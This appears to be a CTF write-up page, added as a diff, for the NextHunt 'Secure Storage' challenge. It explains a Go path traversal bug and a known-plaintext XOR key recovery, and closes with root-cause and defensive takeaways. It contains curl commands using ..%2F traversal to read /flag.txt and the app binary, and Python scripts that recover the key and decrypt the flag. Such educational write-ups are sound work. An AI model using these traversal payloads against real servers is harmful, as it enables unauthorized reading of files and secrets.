@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Storage | NextHunt CTF | CTF Writeups</title>
+    <meta name="description" content="Writeup for Secure Storage web challenge from NextHunt CTF - Path Traversal and XOR Key Extraction">
+    <link rel="stylesheet" href="../css/style.css">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'></text></svg>">
+</head>
+<body>
+    <nav>
+        <div class="container">
+            <a href="../index.html" class="logo"><span class="logo-icon"></span><span>CTF Writeups</span></a>
+            <div class="nav-toggle" onclick="toggleNav()"><span></span><span></span><span></span></div>
+            <ul id="nav-menu">
+                <li><a href="../index.html">Home</a></li>
+                <li><a href="../writeups.html">Writeups</a></li>
+                <li><a href="../about.html">About</a></li>
+                <li><a href="https://github.com/walidzitouni/CTFWriteups" target="_blank">GitHub</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="breadcrumbs">
+        <div class="container">
+            <a href="../index.html">Home</a><span>/</span>
+            <a href="../writeups.html">Writeups</a><span>/</span>
+            <span style="color: var(--primary-purple);">Secure Storage</span>
+        </div>
+    </div>
+
+    <article class="writeup-content">
+        <header>
+            <div class="writeup-tags" style="margin-bottom: 1rem;">
+                <span class="tag">Web</span>
+                <span class="tag">Path Traversal</span>
+                <span class="tag">Crypto</span>
+                <span class="tag difficulty-medium">Medium</span>
+            </div>
+            <h1>Secure Storage</h1>
+            <div class="writeup-meta" style="margin-bottom: 2rem; color: var(--text-muted);">
+                <span>2025</span>
+                <span style="margin: 0 1rem;">|</span>
+                <span>NextHunt CTF</span>
+                <span style="margin: 0 1rem;">|</span>
+                <span>Web Exploitation</span>
+            </div>
+        </header>
+
+        <h2>Challenge Overview</h2>
+        <p>The challenge presents a "Secure Storage" web application that allows users to upload and download files. The files are encrypted using XOR encryption with a session-specific key.</p>
+
+        <h2>Initial Analysis</h2>
+        <p>Key observations from analyzing <code>main.go</code>:</p>
+        <ul>
+            <li><strong>File Upload/Download System</strong>: Users can upload files which are encrypted with XOR before storage</li>
+            <li><strong>Session Management</strong>: Each session gets a unique encryption key (64 bytes) stored in SQLite database</li>
+            <li><strong>Encryption</strong>: Files are XOR encrypted with the session key using <code>xorCopy()</code> function</li>
+            <li><strong>File Paths</strong>: Upload uses <code>filepath.Join()</code> with sanitization, but download uses <code>path.Join()</code></li>
+        </ul>
+
+        <h2>Vulnerability: Path Traversal</h2>
+        <p>The critical vulnerability is in the <code>handleDownload</code> function:</p>
+        <pre><code>fileName := r.PathValue("file")
+filePath := path.Join(dir, fileName)</code></pre>
+
+        <p><strong>The Bug:</strong></p>
+        <ul>
+            <li>The download handler uses <code>path.Join()</code> instead of <code>filepath.Join()</code></li>
+            <li><code>path.Join()</code> is designed for URL paths, not filesystem paths</li>
+            <li>URL-encoded path traversal sequences like <code>..%2F</code> are NOT cleaned by the Go HTTP router</li>
+            <li>After URL decoding, <code>..%2F</code> becomes <code>../</code> which allows directory traversal</li>
+        </ul>
+
+        <h2>Exploitation Strategy</h2>
+        <p>The path traversal allows reading arbitrary files, but there's a catch:</p>
+        <ol>
+            <li>The flag is located at <code>/flag.txt</code></li>
+            <li>When downloading ANY file, it gets XOR encrypted with the session key</li>
+            <li>Downloaded flag = <code>plaintext_flag XOR key</code></li>
+            <li><strong>We need the XOR key to decrypt the flag!</strong></li>
+        </ol>
+
+        <h3>Getting the Encryption Key</h3>
+        <ol>
+            <li><strong>Download the Go binary</strong> at <code>/app/main</code> using path traversal</li>
+            <li>The binary is a <strong>known ELF format</strong> with predictable header bytes</li>
+            <li>Build the same binary locally to get the exact plaintext</li>
+            <li>XOR the downloaded (encrypted) binary with local binary to extract the key:<br>
+                <code>key = encrypted_binary XOR known_plaintext_binary</code></li>
+            <li>Use the extracted key to decrypt the flag</li>
+        </ol>
+
+        <h2>Exploitation Steps</h2>
+
+        <h3>Step 1: Download Encrypted Flag</h3>
+        <pre><code>curl "http://target/download/..%2F..%2F..%2F..%2Fflag.txt" \
+  -b "sid=YOUR_SESSION_COOKIE"</code></pre>
+
+        <h3>Step 2: Download the Binary to Extract Key</h3>
+        <pre><code>curl "http://target/download/..%2F..%2F..%2F..%2Fapp%2Fmain" \
+  -b "sid=YOUR_SESSION_COOKIE" \
+  -o main_encrypted</code></pre>
+
+        <h3>Step 3: Build Local Binary</h3>
+        <pre><code>go build -o main_local main.go</code></pre>
+
+        <h3>Step 4: Extract the 64-byte XOR Key</h3>
+        <pre><code>#!/usr/bin/env python3
+
+with open('main_encrypted', 'rb') as f:
+    encrypted_binary = f.read()
+
+with open('main_local', 'rb') as f:
+    local_binary = f.read()
+
+# Extract 64-byte key by XORing first 64 bytes
+key = bytearray(64)
+for i in range(64):
+    key[i] = encrypted_binary[i] ^ local_binary[i]
+
+print(f"Key: {key.hex()}")</code></pre>
+
+        <h3>Step 5: Decrypt the Flag</h3>
+        <pre><code>#!/usr/bin/env python3
+
+key = bytes.fromhex("3e1169a2c4f80a4c...")  # extracted key
+
+encrypted_flag = bytes.fromhex("507411d7b783667f...")  # from step 1
+
+flag = bytearray()
+for i in range(len(encrypted_flag)):
+    flag.append(encrypted_flag[i] ^ key[i % 64])
+
+print(flag.decode())</code></pre>
+
+        <h2>Root Cause Analysis</h2>
+        <ul>
+            <li><strong>Incorrect Path Function</strong>: Using <code>path.Join()</code> (URL paths) instead of <code>filepath.Join()</code> (filesystem paths)</li>
+            <li><strong>Missing Input Validation</strong>: No sanitization on the <code>fileName</code> parameter in download handler</li>
+            <li><strong>Inconsistent Security</strong>: Upload properly sanitizes with <code>filepath.Base()</code>, but download doesn't</li>
+        </ul>
+
+        <h2>Key Takeaways</h2>
+        <ul>
+            <li><strong>Path vs Filepath</strong>: Go's <code>path</code> package is for URLs, <code>filepath</code> is for filesystem paths</li>
+            <li><strong>Known Plaintext Attacks</strong>: XOR encryption is vulnerable when attackers can access both ciphertext and plaintext</li>
+            <li><strong>Defense in Depth</strong>: Multiple controls prevent exploitation</li>
+        </ul>
+
+        <h2>Flag</h2>
+        <div class="flag-box">
+            <div class="flag-label">Flag</div>
+            <div class="flag-value">nexus{l34k_7h3_k3y_br34k7h3_c1ph3r}</div>
+        </div>
+
+        <div style="margin-top: 3rem; padding-top: 2rem; border-top: 1px solid rgba(155, 89, 182, 0.3);">
+            <a href="../writeups.html" class="btn btn-secondary">Back to Writeups</a>
+        </div>
+    </article>
+
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-brand"><a href="../index.html" class="logo"><span class="logo-icon"></span><span>CTF Writeups</span></a></div>
+                <div class="footer-links"><a href="../index.html">Home</a><a href="../writeups.html">Writeups</a><a href="../about.html">About</a></div>
+            </div>
+        </div>
+    </footer>
+    <script>function toggleNav() { document.getElementById('nav-menu').classList.toggle('active'); }</script>
+</body>
+</html>
